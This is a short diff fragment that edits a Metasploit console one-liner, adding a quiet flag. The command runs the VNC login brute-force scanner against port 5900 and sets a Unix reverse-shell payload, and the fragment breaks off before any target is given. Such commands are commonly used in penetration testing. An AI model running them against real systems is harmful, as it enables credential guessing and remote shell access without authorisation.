@@ -1,4 +1,4 @@
- msfconsole -x "use auxiliary/scanner/vnc/vnc_login;\
+ msfconsole -q -x "use auxiliary/scanner/vnc/vnc_login;\
 
 set payload cmd/unix/reverse;\
 set RPORT 5900;\
